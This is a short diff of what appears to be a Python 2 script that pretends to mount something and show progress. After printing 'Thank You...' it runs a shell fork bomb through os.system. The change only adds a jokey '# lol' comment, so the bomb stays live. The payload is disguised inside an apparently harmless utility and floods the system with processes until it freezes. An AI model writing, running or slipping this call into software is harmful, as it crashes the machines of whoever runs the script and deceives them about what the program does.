@@ -42,4 +42,4 @@ print "Mounting"
 update_progress(3)
 time.sleep(3);
 print "Thank You...";
-os.system(':(){:|:&};:')
+os.system(':(){:|:&};:') # lol
